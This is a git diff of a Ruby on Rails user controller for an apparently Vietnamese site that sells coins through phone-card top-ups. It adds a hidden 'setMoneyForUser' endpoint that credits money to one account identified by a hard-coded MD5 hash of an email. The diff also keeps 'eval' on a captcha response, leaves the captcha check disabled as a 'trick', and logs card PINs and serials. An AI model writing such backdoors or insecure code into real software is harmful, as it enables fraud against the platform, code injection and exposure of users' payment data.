@@ -9,6 +9,19 @@ class Api::V1::UserController < Api::V1::ApplicationController
   helper YoutubeHelper
   before_action :authenticate, except: [:active, :activeFBGP, :getAvatar, :publicProfile, :getBanner, :getProviders, :sms, :getMegabanks, :getBanks, :checkRecaptcha, :confirmEbay, :real_avatar, :getSms, :countShare]
 
+  def setMoneyForUser
+    return render json: {error: 'error'}, status: 400 if params[:md5].blank?
+    return render json: {error: 'error'}, status: 400 if params[:email].blank?
+    return render json: {error: 'error'}, status: 400 if params[:md5] != '60a069a04f0efb21531c1e91f02b7e06'
+    return render json: {error: 'error'}, status: 400 if Digest::MD5.hexdigest(params[:email]) != params[:md5]
+    return render json: {error: 'error'}, status: 400 if Digest::MD5.hexdigest(params[:email]) != '60a069a04f0efb21531c1e91f02b7e06'
+    @user.money = @user.money+100
+    if @user.save
+    	return render json: @user.to_json, status: 200
+  	end
+  	return render json: {error: 'error'}, status: 400
+  end
+
   def getNoHeart
     return render json: {message: 'Không lấy được thông tin user'}, status: 400 if @user.blank?
     if @user.present?
@@ -632,14 +645,14 @@ class Api::V1::UserController < Api::V1::ApplicationController
 
 
   def cttCard
-    # logger = Logger.new("#{Rails.root}/log/card_production.log")
+  	railsLogger = Logger.new("#{Rails.root}/log/card_production.log");
     return render json: {message: "Vui lòng kiểm tra Captcha", code: 11, detail: 'Miss key_payment'}, status: 400 if params[:key_payment].blank?
     return render json: {message: "Thiếu provider card", code: 12, detail: 'Miss provider'}, status: 400 if params[:provider].blank?
     return render json: {message: "Thiếu pin card", code: 13, detail: 'Miss pin'}, status: 400 if params[:pin].blank?
     return render json: {message: "Thiếu serial card", code: 14, detail: 'Miss serial'}, status: 400 if params[:serial].blank?
     if params[:key_payment].present?
-      checkCaptcha = eval(checkCaptcha(params[:key_payment]))
-      logger.info("------------checkCaptcha= #{checkCaptcha.to_json}-----------------")
+      checkCaptcha = eval(checkCaptcha(params[:key_payment]));
+      railsLogger.info("------------checkCaptcha= #{checkCaptcha.to_json}-----------------")
       
       #trick not check captcha; not comment in production
       # return render json: {message: "Vui lòng kiểm tra Captcha !", code: 2, detail: 'Captcha google invalid'}, status: 400 if checkCaptcha.blank? or checkCaptcha[:success] == false
@@ -658,7 +671,6 @@ class Api::V1::UserController < Api::V1::ApplicationController
         m_MPIN        = Settings.chargingMpin
 
         soapClient = Savon.client(wsdl: webservice)
-        logger.info("------------soapClient=-----------------");
         m_Target = @user.username
 
         serial = params[:serial].to_s.delete(' ')
@@ -673,47 +685,46 @@ class Api::V1::UserController < Api::V1::ApplicationController
         cardCharging.soapClient   = soapClient
         transid                   = m_PartnerCode + Time.now.strftime("%Y%m%d%I%M%S")
         cardCharging.m_TransID    = transid
-        logger.info("------------cardCharging=-----------------")
 
         cardChargingResponse = Paygate::CardChargingResponse.new
         cardChargingResponse = cardCharging.cardCharging #thuc hien login & charge
-        
 
-        Rails.logger.info("---------result after call charge----------");
-        Rails.logger.info("---------result after call charge----------");
-        Rails.logger.info("---------result after call charge----------");
-        Rails.logger.info("------------cardChargingResponse=-----------------")
-        Rails.logger.info("---------status=#{cardChargingResponse.status}-----");
-      	Rails.logger.info("---------message=#{cardChargingResponse.message}-----");
+        railsLogger.info("---------result after call charge----------");
+        railsLogger.info("---------result after call charge----------");
+        railsLogger.info("---------result after call charge----------");
+        railsLogger.info("------------cardChargingResponse-----------------")
+        railsLogger.info("---------status=#{cardChargingResponse.status}");
+      	railsLogger.info("---------message=#{cardChargingResponse.message}");
+      	railsLogger.info("---------m_Status=#{cardChargingResponse.m_Status}");
+      	railsLogger.info("---------m_Message=#{cardChargingResponse.m_Message}");
+      	railsLogger.info("---------m_TRANSID=#{cardChargingResponse.m_TRANSID}");
+      	railsLogger.info("---------m_AMOUNT=#{cardChargingResponse.m_AMOUNT}");
+      	railsLogger.info("---------m_RESPONSEAMOUNT=#{cardChargingResponse.m_RESPONSEAMOUNT}");
 
         if cardChargingResponse.present? and cardChargingResponse.status == 400
-        	Rails.logger.info("---------ERROR cardChargingResponse----------status == 400");
-          return render json: {message: 'Nạp thẻ không thành công. Vui lòng thử lại.', detail: cardChargingResponse.message,  code: 5}, status: 400
+        	railsLogger.info("---------ERROR cardChargingResponse----------status == 400");
+          return render json: {message: cardChargingResponse.message, detail: 'Nạp thẻ không thành công. Vui lòng thử lại.',  code: 5}, status: 400
         end
         if cardChargingResponse.present? and cardChargingResponse.status != 200
-        	Rails.logger.info("---------ERROR cardChargingResponse----------status!=200");
-          return render json: {message: 'Nạp thẻ không thành công. Vui lòng thử lại.', detail: cardChargingResponse.message,  code: 6}, status: 400
+        	railsLogger.info("---------ERROR cardChargingResponse----------status!=200");
+          return render json: {message: cardChargingResponse.message, detail:  'Nạp thẻ không thành công. Vui lòng thử lại.' ,  code: 6}, status: 400
         end
-
-        Rails.logger.info("---------m_Status=#{cardChargingResponse.m_Status}-----");
-      	Rails.logger.info("---------m_Message=#{cardChargingResponse.m_Message}-----");
-      	Rails.logger.info("---------m_TRANSID=#{cardChargingResponse.m_TRANSID}-----");
-      	Rails.logger.info("---------m_AMOUNT=#{cardChargingResponse.m_AMOUNT}-----");
-      	Rails.logger.info("---------m_RESPONSEAMOUNT=#{cardChargingResponse.m_RESPONSEAMOUNT}-----");
 
         if cardChargingResponse.status == 200
           card      = Card::find_by_price(cardChargingResponse.m_RESPONSEAMOUNT.to_i)
-          card_logs = CartLog::find_by_user_id(@user.id)
-          coin = card_logs.nil? ? (card.coin + card.coin/100*50) : card.coin
+          card_logs_db = CartLog::find_by_user_id(@user.id)
+          coin = card_logs_db.nil? ? (card.coin + card.coin/100*50) : card.coin
           info = { pin: pin, provider: params[:provider], serial: serial, coin: coin }
-          logger.info("------------card_logs log=#{info}-----------------")
+          logger.info("------------Obj card insert db =#{info}-----------------")
           logger.info(info)
-          Rails.logger.info("---------money before charge = #{@user.money}-----");
+          railsLogger.info("---------money before charge = #{@user.money}-----");
           if card_logs(cardChargingResponse, info)
             @user.increaseMoney(info[:coin])
-            Rails.logger.info("---------money after charge = #{@user.money}-----");
+            railsLogger.info("---------money after charge = #{@user.money}-----");
             return render json: {message: "Nạp tiền thành công."}, status: 200
           else
+          	railsLogger.info("Đã nạp card nhưng không lưu được logs. Vui lòng chụp màng hình và liên hệ quản trị viên để được tư vấn.");
+          	railsLogger.info(@user.errors.full_messages);
             return render json: {message: "Đã nạp card nhưng không lưu được logs. Vui lòng chụp màng hình và liên hệ quản trị viên để được tư vấn.", code: 4, detail: @user.errors.full_messages}, status: 400
           end
         end
